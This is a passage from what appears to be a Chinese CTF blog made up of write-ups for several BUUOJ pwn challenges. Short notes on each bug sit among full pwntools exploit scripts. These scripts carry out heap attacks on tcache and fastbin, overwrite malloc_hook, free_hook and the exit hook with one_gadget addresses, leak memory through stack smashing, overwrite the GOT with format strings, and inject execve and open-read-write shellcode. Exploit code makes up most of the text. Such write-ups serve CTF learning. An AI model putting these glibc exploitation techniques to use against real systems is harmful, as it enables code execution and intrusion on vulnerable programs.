add(0x10,'1') free(1) free(0) data = '\\x00'*0x60+p64(0x100) add(0x68,data) free(2) add(0x80,'\\x00') add(0x68,'\\x00') add(0xf0,'1') add(0x68,'1') add(0x18,'1') free(2) free(5) free(0) show(4) r() libc_base = uu64(r(6)) - 0x3c4b31 info_addr('libc_base ',libc_base) malloc_hook=libc_base+libc.symbols['__malloc_hook'] realloc_hook=libc_base+libc.symbols['realloc'] add(0x68,p64(malloc_hook-0x23)) add(0x68,p64(malloc_hook-0x23)) add(0x68,p64(malloc_hook-0x23)) onegadget = 0x4526a + libc_base data = '\\x00'*0xb+p64(onegadget)+ p64(realloc_hook+realloc[0]) add(0x68,data) sla('&gt;','1'*500) # debug() itr() 后记 还可以攻击calloc_hook,因为seccomp里面调用了calloc。 攻击io file 进行泄漏和orw。（先等待复现）https://github.com/Starssgo/pwn_challange/blob/master/domo/exp.py gyctf_2020_signin分析 uaf，但是存在一个flag位用于检测是否free过 edit只能一次 存在后门函数，其中还会用calloc申请一个chunk,并且只需要0x004040C0处有数值即可触发。 前置知识calloc 的特性： 在申请到的chunk上会进行一个置零的操作 不会从tcache bin 中取chunk tcache 的_int_malloc有以下特性： 在分配 fastbin 中的 chunk 时，若此chain上还有其他chunk ，则调用tcache_put把它们全部放入 tcache 中(smallbins中也是如此)。 /* While we're here, if we see other chunks of the same size, stash them in the tcache. */ size_t tc_idx = csize2tidx (nb); if (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins) &#123; mchunkptr tc_victim; /* While bin not empty and tcache not full, copy chunks over. */ while (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count &amp;&amp; (pp = *fb) != NULL) &#123; REMOVE_FB (fb, tc_victim, pp); if (tc_victim != 0) &#123; tcache_put (tc_victim, tc_idx); &#125; &#125; &#125; 攻击思路 申请8个堆， 释放8个堆，最后一个会进入fastbin edit idx=8 的chunk，改其fd为0x004040C0 - 0x10 申请一个chunk，此时会在tcache chain中拿走一个，留出一个空位 调用后门函数，其中calloc会从fastbin中拿出idx=8的chunk，但是由于其特性，会把剩下的fd上地址也当作一个chunk丢进tcache 丢进时是丢在tcache的头部，所以会跟tcache 进行一个link。也就是会在这个fd地址上写下，tcache chain 上其紧挨着的chunk地址。这就造成一个任意地址写。 漏洞产生原因也是，libc源码中tcache_put基本没有安全检查。 exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './gyctf_2020_signin' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',27592) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce18 = [0x4f2c5,0x4f322,0x10a38c] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(idx): sla('your choice?','1') sla('idx',str(idx)) def edit(idx,data): sla('your choice?','2') sla('idx',str(idx)) s(str(data)) def free(idx): sla('your choice?','3') sla('idx',str(idx)) for i in range(8): add(i) for i in range(8): free(i) edit(7,p64(0x4040C0-0x10)) add(8) sla('your choice?','6') debug() itr() 题记在做的时候，开始有个想法，malloc申请堆时，会在其返回地址的上方留下size信息，以此来利用。但是在验证后，发现是不会的。 gyctf_2020_document分析 存在uaf漏洞 只能申请一个0x20、0x90的堆块，不能进行fastbin进行攻击。 person数据结构 ┌──────────────────────┬────┐ │ │0x21│ ├─────────────┬────────┴────┤ │ │ │ │ main_heap │ flag │ ├─────────────┴─────────────┤ │ 0x91│ │─────────────┬─────────────┤ │ │ ├──────▶0x10 │ name │ sex │ ├─────────────▼─────────────┤ │ │ │ │ │ │ │ │ │ │ │ data │ │ │ ┌────┐ │ ├──────▶│0x80│ │ │ └────┘ │ │ │ │ │ │ │ │ └───────────────────────────┘ 攻击思路 释放一个0x90的堆，利用uaf进行泄漏libc 申请2个堆，此时在这个0x90的unsortbin会留下2个0x20的person数据结构的头 edit这个释放的堆，控制其中main_heap的地址，然后进行任意地址写。 exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './gyctf_2020_document' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',25009) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [0x4f2c5,0x4f322,0x10a38c] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(name,sex,data): sla('choice','1') sa('name',str(name)) sa('sex',str(sex)) sa('infor',str(data)) def show(idx): sla('choice','2') sla('index',str(idx)) def edit(idx,sex,data): sla('choice','3') sla('dex',str(idx)) sa('sex',str(sex)) sa('infor',str(data)) def free(idx): sla('choice','4') sla('index',str(idx)) data = '1' * 0x78 add('chumen77','W',data) add('chumen77','W',data) free(0) show(0) r() libc_base = uu64(r(6)) - 0x3c4b78 info_addr('libc_base',libc_base) add('chumen77','W',data) add('chumen77','W',data) free_hook = 0x3c67a8 + libc_base data = '\\x00'* 8 + p64(0x71) + p64(free_hook-0x10) + '\\x01' * 0x58 edit(0,\"N\",data) data = p64(libc_base + 0x4526a) + 0x68 * '\\x00' edit(3,'N',data) free(0) itr() wdb_2018_guess分析主要就是利用stack smashing。 stack smashing原理在程序启动 canary 保护之后，如果发现 canary 被修改的话，程序就会执行 __stack_chk_fail函数来打印 argv[0] 指针所指向的字符串，正常情况下，这个指针指向了程序名。其代码如下 void __attribute__ ((noreturn)) __stack_chk_fail (void) &#123; __fortify_fail (\"stack smashing detected\"); &#125; void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg) &#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, \"*** %s ***: %s terminated\\n\", msg, __libc_argv[0] ?: \"&lt;unknown&gt;\"); &#125; 所以说如果我们利用栈溢出覆盖 argv[0] 为我们想要输出的字符串的地址，那么在 fortify_fail 函数中就会输出我们想要的信息。 注意其是%s来打印东西的，所以在利用时要用argv[0]做个跳板。 如何获取栈值https://blog.csdn.net/chennbnbnb/article/details/104035261 Libc上的_environ存放着当前进程的环境变量，其是一个栈地址。 以此来获取栈值，然后根据偏移来访问栈中的数据。 攻击思路 获取libc基地址 获取stack地址，根据偏移找到存放flag的stack address 覆盖argv[0]为flag的stack address 其中每次都是用gets 覆盖到覆盖argv[0] ,stack smashing来完成。 exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './GUESS' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',26813) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() data = '1' * 0x128 + p64(elf.got['__libc_start_main']) sla('flag',data) ru('hing detected ***: ') libc_base = uu64(r(6)) - 0x20740 info_addr('libc_base',libc_base) data = '1' * 0x128 + p64(libc.sym['_environ'] + libc_base) sla('flag',data) ru('hing detected ***: ') stack_flag = uu64(r(6)) - 0x168 info_addr('stack_base',stack_flag) data = '1' * 0x128 + p64(stack_flag) sla('flag',data) itr() suctf_2018_basic pwn无脑栈溢出 #!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './SUCTF_2018_basic_pwn' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',25741) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [0x4f2c5,0x4f322,0x10a38c] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() data = '1' * 0x118 + p64(0x000000401157) sl(data) itr() SWPUCTF_2019_p1KkHeap分析 开了沙箱，可以orw拿到flag 功能只能调用18次，free只能3次 free中存在uaf mmap了一块 rwx的内存在 0x66660000 攻击思路 泄漏heap base，准备攻击tcache bin的表头 覆盖bin counts为7，伪造满bin，free chunk，泄漏libc 攻击tcache bin的表头中bin chunk header 的部分，放下0x66660000 和malloc_hook，准备修改这两个部分。 在0x66660000的内存上写下orw的shellcode 攻击malloc_hook为0x66660000 取得flag exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './SWPUCTF_2019_p1KkHeap' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',29911) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() ''' ================================================================================ line CODE JT JF K ================================= 0000: 0x20 0x00 0x00 0x00000004 A = arch 0001: 0x15 0x00 0x09 0xc000003e if (A != ARCH_X86_64) goto 0011 0002: 0x20 0x00 0x00 0x00000000 A = sys_number 0003: 0x35 0x07 0x00 0x40000000 if (A &gt;= 0x40000000) goto 0011 0004: 0x15 0x06 0x00 0x0000003b if (A == execve) goto 0011 0005: 0x15 0x00 0x04 0x00000001 if (A != write) goto 0010 0006: 0x20 0x00 0x00 0x00000024 A = count &gt;&gt; 32 # write(fd, buf, count) 0007: 0x15 0x00 0x02 0x00000000 if (A != 0x0) goto 0010 0008: 0x20 0x00 0x00 0x00000020 A = count # write(fd, buf, count) 0009: 0x15 0x01 0x00 0x00000010 if (A == 0x10) goto 0011 0010: 0x06 0x00 0x00 0x7fff0000 return ALLOW 0011: 0x06 0x00 0x00 0x00000000 return KILL ''' def add(size): sla('ice','1') sla('size',str(size)) def show(idx): sla('ice','2') sla('id',str(idx)) def edit(idx,data): sla('ice','3') sla('id',str(idx)) sa('tent',str(data)) def free(idx): sla('ice','4') sla('id',str(idx)) add(0x100) #0 free(0) free(0) show(0) ru('content: ') heap_base = uu64(r(6)) - 0x260 info_addr('heap_base',heap_base) add(0x100) #1 edit(1,p64(heap_base+0x10)) add(0x100) #2 add(0x100) #3 debug() data = p64(8) + '\\x07'*8 edit(3,data) add(0x80)#4 free(0) show(0) ru('content: ') libc_base = uu64(r(6)) - 0x3ebca0 info_addr('libc_base',libc_base) data = p64(8) + '\\x07'*8 + '\\x00' * (0xc0 - 0x20) + p64(0x3ebc30 + libc_base) +p64(0x66660000) edit(3,data) add(0x100) #5 orw = shellcraft.open('flag') orw += shellcraft.read(3,0x66660100,0x64) orw +=shellcraft.write(1,0x66660100,0x64) edit(5,asm(orw)) add(0xf0) #6 edit(6,p64(0x66660000)) add(1) itr() 题记在学习别人的exp时，发现还有泄漏libc的另外一种办法，这种办法泄漏出libc，也使得整个exp，基本跟我的不大相同。 知识点在tcache bin的表头中，其每个大小tcache bin的count(0-7) 是一个无符号类型的数据。 当用uaf漏洞，在一个chain上伪造一个chunk地址，这样当申请后tcache bin的count会变成0xff&gt;0x7，这样利用uaf，再次释放这个chain上 的chunk，就会进入到unsortbin，接着就leak 出libc了。 pwndbg&gt; parseheap addr prev size status fd bk 0x55daa2e85000 0x0 0x250 Used None None 0x55daa2e85250 0x0 0x110 Freed 0x7fb70dbbaca0 0x7fb70dbbaca0 0x55daa2e85360 0x110 0x110 Freed 0x55daa2e85370 None pwndbg&gt; x/30gx 0x55daa2e85000 0x55daa2e85000: 0x0000000000000000 0x0000000000000251 0x55daa2e85010: 0x0000000000000000 0xff00000000000000 0x55daa2e85020: 0x0000000000000000 0x0000000000000000 剩下的就是进行tcache dup即可。这个比我那个方法要简单的多。 参考链接https://blog.csdn.net/github_36788573/article/details/103475238 https://blog.csdn.net/seaaseesa/article/details/103450524 护网杯_2018_gettingstart白给题。考浮点数在内存中是怎么存的。 data = '1' * 24 + p64(0x7fffffffffffffff) + p64(0x3FB999999999999A) s(data) itr() [OGeek2019]bookmanager分析 存在heap overflow uaf off by one 一堆洞，伪代码看起来很复杂，但是利用起来较为简单。 重点漏洞函数在 updata上。 exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './pwn-2' elf = ELF(local_file) context.log_level = 'debug' debug = 1 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',29005) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add_chapter(name): sla('choice','1') sa('name',str(name)) def add_section(chapter,name): sla('choice','2') sa('into',str(chapter)) sa('name',str(name)) def add_text(section,size,data): sla('choice','3') sa('into',str(section)) sla('write',str(size)) sa('Text',str(data)) def del_chapter(name): sla('choice','4') sla('name',str(name)) def del_section(name): sla('choice','5') sla('name',str(name)) def del_text(name): sla('choice','6') sla('name',str(name)) def show(): sla('choice','7') def edit(type,name,data): sla('choice','8') sla('update',str(type)) sa('name',str(name)) sa('New',str(data)) sla('Name','chumen77' * 4) add_chapter('chumen77') add_section('chumen77','1') add_section('chumen77','2') add_section('chumen77','3') add_text('1',0x100,'1'*0x100) # show() add_text('2',0x100,'2'*0x100) del_section('1') del_section('2') show() ru('Section:') libc_base = uu64(r(6)) - 0x3c4b78 info_addr('libc_base',libc_base) free_hook = 0x3c67a8 + libc_base add_text('3',0x100,'1'*0x100) edit('Section',3,'3' + '\\x00' + '1'*(0x20-2) + '\\xd0') data = p64(free_hook) + p64(0x20) edit('Text','3',data) one = libc_base + rce16[2] edit('Text','3',p64(one)) del_chapter('chumen77') # debug() itr() 题记 题是简单题，但是由于代码一多，且指针看起来复杂，个人做起来就有点慢，并且让自己连最简单的heap overflow都没有想起来去利用。 解决办法 对于指针复杂的堆信息分配，可以直接gdb上手调来确定基本堆信息。 de1ctf_2019_weapon分析 uaf 最大只能申请0x60的chunk 没有show函数 部分input利用scanf来获取读入 攻击思路 free 2个chunk，然后用scanf 读入大量的字符，来获取一个smallbin 利用残留的libc地址，fastbin attck IO_stdout来泄漏libc fastbin attck malloc_hook exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './de1ctf_2019_weapon' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',28987) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [0x4f2c5,0x4f322,0x10a38c] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(idx,size,data): sla('ice','1') sla('size of weapon:',str(size)) sla('dex',str(idx)) sa('name',str(data)) def free(idx): sla('ice','2') sla('idx',str(idx)) def edit(idx,data): sla('ice','3') sla('idx',str(idx)) sa('new',str(data)) def leak_addr(): add(0,0x60,'1') add(1,0x60,'1') add(2,0x60,'1') add(3,0x60,'1') free(0) free(1) sla('ice','1' * 0x1000) add(4,0x60,p16(0xa5dd)) free(3) free(2) free(3) edit(3,'\\x00') add(5,0x60,'1') add(6,0x60,'1') # debug() data = '\\x00' * 0x33 + p64(0xfbad3c80) + p64(0) * 3 + p8(0) add(7,0x60,data) leak = 0 while True: try: leak_addr() ss = io.recvuntil(chr(0x7f),timeout = 0.5) if len(ss) == 0: raise Exception('') io.recv(10) leak = uu64(r(6)) if leak == 0x7ff81b57b6a3: raise Exception('') break except Exception: io.close() # io = process('./de1ctf_2019_weapon') io = remote('node3.buuoj.cn',28987) continue info_addr('leak',leak) libc_addr = leak - 0x3c56a3 info_addr('libc_base',libc_addr) malloc_hook = 0x3c4b10 + libc_addr free(0) free(2) free(0) edit(0,p64(malloc_hook - 0x13)) add(7,0x60,'1') one = rce16[3] + libc_addr data = '\\x00' * 3 + p64(one) add(8,0x60,data) sla('ice','1') sla('size of weapon:','10') sla('dex','9') # add(9,0x30,'1') # debug() itr() starctf_2019_babyshell分析会有一个函数检查你的shellcode是否满足要求。 for ( i = a1; *i; ++i ) &#123; for ( j = &amp;unk_400978; *j &amp;&amp; *j != *i; ++j ) ; if ( !*j ) // 检查shellcode合法的函数，遍历shellcode的每个字符，在0x400987处找是否有匹配。 return 0LL; &#125; return 1LL; 需要0x400987地址处的字节码匹配。倘若发现有不匹配的字节，就直接check不过。 可以用的有 pop rdx、pop rdi、syscall 方法一有师傅的做法，就是用这3个汇编，强行凑出一个read，然后把shellcode再次读到mmap的buf上合适的位置（此题加12），再次调用到shellcode。 https://www.cnblogs.com/Rookle/p/12895895.htmlhttps://github.com/sixstars/starctf2019/tree/master/pwn-shellcodehttps://blog.csdn.net/seaaseesa/article/details/105863820 对于一些受限的shellcode，我们最好的办法是构造read系统调用。 方法二还有就是这个循环，其实直接可以用\\x00截断，因为开头循环条件2 给0 直接就不执行下面的检测循环，return 1 走了。 但是跳过去需要，提前再布置几个机器码字节保证不影响下面的shellcode。 可以直接在ida里面设置显示机器码，以后直接选取合适的机器码整上去就可以了。 00 5A 5A add [rdx+5Ah], bl expshellcode = asm(shellcraft.sh()) s('\\x00'+ '\\x5a' +'\\x00'+ shellcode) 题记感觉个人shellcode能力较差，得抽时间学习下。 hfctf_2020_marksman分析上来给了libc地址，可以任意地址3个字节的写入。 难点1修改那里的地址，才能控制程序流程。 可以修改exit_hook:https://blog.csdn.net/qq_43116977/article/details/105485947参考这里。 在退出时： exit()-&gt;__run_exit_handlers-&gt;_dl_fini-&gt;__rtld_lock_unlock_recursive 修改__rtld_lock_unlock_recursive或者__rtld_lock_lock_recursive即可。 gdb 快速获取这个地址的办法： pwndbg&gt; p &amp;_rtld_global._dl_rtld_lock_recursive 难点2one gadget的调整。 其中 one_gadget -lx 这个可以设置扫描等级获取更多的one gadget。 并且在程序中： signed __int64 __fastcall sub_BC2(_BYTE *a1) &#123; if ( (*a1 != 0xC5u || a1[1] != 0xF2u) &amp;&amp; (*a1 != 0x22 || a1[1] != 0xF3u) &amp;&amp; *a1 != 0x8Cu &amp;&amp; a1[1] != 0xA3u ) return 1LL; puts(\"You always want a Gold Finger!\"); return 0LL; &#125; 对写入的地址也给限制了不能出现这几个字节。其中就让很好的: 0x10a38c execve(\"/bin/sh\", rsp+0x70, environ) constraints: [rsp+0x70] == NULL 不让写入使用了。其他的因为地址小，爆破差距大，或者限制条件高，不适合使用。 想办法调整一下，来实现上面这个one gadget的使用。 http://taqini.space/2020/04/29/about-execve/#One-gadget-%E9%99%90%E5%88%B6%E6%9D%A1%E4%BB%B6%E5%89%96%E6%9E%90 参考 taqini师傅的这个文章，发现其中就有对这个的分析，发现最重要的就是：rsi rdi rdx要给控制好，其中这个gadget附近的汇编如图所示 其中8c结尾的汇编之后是一定要执行的，其中就控制了rsi rdi rdx。并且8c这条汇编也是不可以跳过，控制的rax，在这个one gadget 中是很有用的，否则当初作者在写这个one gadget怎么没有跳过，直接从93结尾汇编开始了。 向上看有个call指令，这是对接下来的one gadget执行并无造成重要参数大的影响的，所以可以尝试向上写一个地址，让这个gadget从0x10a387开始。 执行下去发现是可以满足execve(&quot;/bin/sh&quot;, 0, environ)的。 此题中对于exit hook 的改写中，_dl_rtld_lock_recursive 可以完成条件的满足。_dl_rtld_unlock_recursive不可以。具体跟过去会发现是在第2和参数出了问题，且在one gadget中第二个参数的控制很玄学，且很难控制，让人头大。 expru('0x') libc_base = int(r(12),16) - libc.sym['puts'] info_addr('libc_base',libc_base) exit_hook = 0x81df60 + libc_base one = 0x10a387 + libc_base # debug() sl(str(exit_hook)) sla('biang',chr((one &amp;0xff))) sla('biang!',chr((one &gt;&gt; 8 &amp;0xff))) sla('biang!',chr((one &gt;&gt; 16 &amp;0xff))) itr() 题记对于修改_dl_fini，又发现了一个很好的参考链接：https://bbs.pediy.com/thread-248495.htm#msg_header_h2_1 sctf_2019_easy_heap分析 开头mmap 一段内存 rwx libc 2.27的off by null 没有show 攻击思路 先上来申请一个0x1000的内存块，然后释放，可以保证每次申请的堆块上都存有libc信息，准备攻击利用 off by null 留出 2个重叠的堆块 一个攻击 mmap，另一个攻击malloc hook 由于tcache 基本没有什么检查，利用起来较为容易。 exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './sctf_2019_easy_heap' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',28382) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = [0x45216,0x4526a,0xf02a4,0xf1147] rce18 = [0x4f2c5,0x4f322,0x10a38c] realloc = [0x2,0x4,0x6,0xB,0xC,0xD] arae18 = 0x3ebca0 s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size): sla('&gt;&gt;','1') sla('ize',str(size)) def free(idx): sla('&gt;&gt;','2') sla('dex',str(idx)) def edit(idx,data): sla('&gt;&gt;','3') sla(\"dex\",str(idx)) sa('tent',str(data)) ru('0x') mmap = int(r(10),16) add(0x1000) add(0x10) #1 free(0) add(0x90) #0 add(0x28) #2 add(0x18) #3 add(0xf0) #4 for i in range(7): add(0x90) for i in range(7): free(i+5) add(0xf0) for i in range(7): free(i+5) free(0) edit(3,'\\x00' * 0x10 + p64(0xb0+0x40)) free(4) add(0x28) #0 add(0x28) #4 add(0x18) #5 add(0x10) #6 add(0x28) #7 add(0x18) #8 free(4) free(7) edit(2,'\\x60' + '\\n') edit(0,p64(mmap) + '\\n') add(0x28) #4 add(0x28) #7 add(0x28) #9 free(6) free(8) edit(3,'\\xc0' + '\\n') edit(5,p8(0x30) + '\\n') add(0x18) #6 add(0x18) #8 add(0x18) #10 shellcode = \"\"\" call here .ascii \"/bin/sh\" .byte 0 here: pop rdi xor rsi,rsi xor rdx,rdx mov rax,0x3b syscall \"\"\" edit(9,asm(shellcode) + '\\n') edit(10,p64(mmap) + '\\n') add(0x200) # debug() itr() 题记这个题还有一种办法攻击mmap就是用unlink来进行，因为题目就给了&amp;heap ，题目预期解就是这样。 另外一种解法，就是攻击stdout，泄漏libc地址，然后攻击malloc hook。 ciscn_2019_sw_1分析32位，单次格式化字符串的利用。无法一次性的获得shell。至少运行2次。 攻击__do_global_dtors_aux_fini_array_entry，让其再次运行一次，且同时改 printf got 的值为system plt。然后送一个 /bin/sh\\x00即可。 expoffset = 4 payload = fmtstr_payload(offset,&#123;0x804979C:0x8048534,elf.got['printf']:elf.plt['system']&#125;,write_size = \"short\",numbwritten = 0) s(payload) sleep(1) sa('name','/bin/sh\\x00') itr() 因为是32位，用fmtstr_payload是很好用的。 lctf2016_pwn200分析 开头不输入\\n，48字符可以泄露出stack地址 有第一段可控的栈，且可以覆盖到heap ptr int sub_400A29() &#123; char buf; // [rsp+0h] [rbp-40h] char *dest; // [rsp+38h] [rbp-8h] dest = (char *)malloc(0x40uLL); puts(\"give me money~\"); read(0, &amp;buf, 0x40uLL); strcpy(dest, &amp;buf); ptr = dest; return sub_4009C4(); &#125; 一次只能申请一个堆，大小0-0x80,且先释放才能再次申请。 保护情况，无任何保护，所以可以写shellcode，jmp 上去即可。 攻击思路 利用可控的栈，hos 在栈上fake 一个堆，保证可以改到ret address 申请同大小的堆，改ret address jmp 到 shellcode exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './pwn200' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',26670) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' s = lambda data :io.send(data) sa = lambda delim,data :io.sendafter(delim, data) sl = lambda data :io.sendline(data) sla = lambda delim,data :io.sendlineafter(delim, data) r = lambda numb=4096 :io.recv(numb) ru = lambda delims, drop=True :io.recvuntil(delims, drop) uu32 = lambda data :u32(data.ljust(4, '\\0')) uu64 = lambda data :u64(data.ljust(8, '\\0')) info_addr = lambda tag, addr :io.info(tag + '==&gt;' +': &#123;:#x&#125;'.format(addr)) itr = lambda :io.interactive() def debug(): # gdb.attach(proc.pidof(io)[0],gdbscript='b main') gdb.attach(io) pause() def add(size,data): sla('choice','1') sla('long',str(size)) sa('me',str(data)) def free(): sla('choice','2') shellcode = asm(shellcraft.sh()) sa('u',shellcode) ru('\\x05') leak_stack = uu64(r(6)) info_addr('leak_stack',leak_stack) shellcode_addr = leak_stack - 0x50 # debug() sla('id','65') payload = p64(0)*5 + p64(0x41) + p64(0) + p64(leak_stack - 0x90) sa('money',payload) free() payload = p64(0)*3 + p64(shellcode_addr) add(0x38,payload) sleep(0.2) sla('choice','3') # debug() itr() vn_pwn_babybabypwn分析 开了沙盒保护，只能orw 开始给了libc地址 程序主要执行了rt_sigreturn，肯定是奔着srop去的 难点 orw的rop应该往哪里写，栈地址是不知道的 可以在libc上找一段无用的地方进行写即可。比如 libc的bss，free hook段。 有的gadget 使用ropgadget找不到 libc.search(asm(\"syscall \\nret\")).next() 可以通过机器码来找。 srop 中frame执行的顺序 frame.rip 是先执行的地址。而 frame.rsp 的值就是我们执行完 frame.rip 后，要执行的值 exp#!/usr/bin/env python # encoding: utf-8 from pwn import * import time local_file = './vn_pwn_babybabypwn' elf = ELF(local_file) context.log_level = 'debug' debug = 0 if debug: io = process(local_file) libc = elf.libc else: io = remote('node3.buuoj.cn',25535) libc = elf.libc #libc = ELF('.') context.arch = elf.arch context.terminal = ['tmux','neww'] #,''splitw','-h' rce16 = 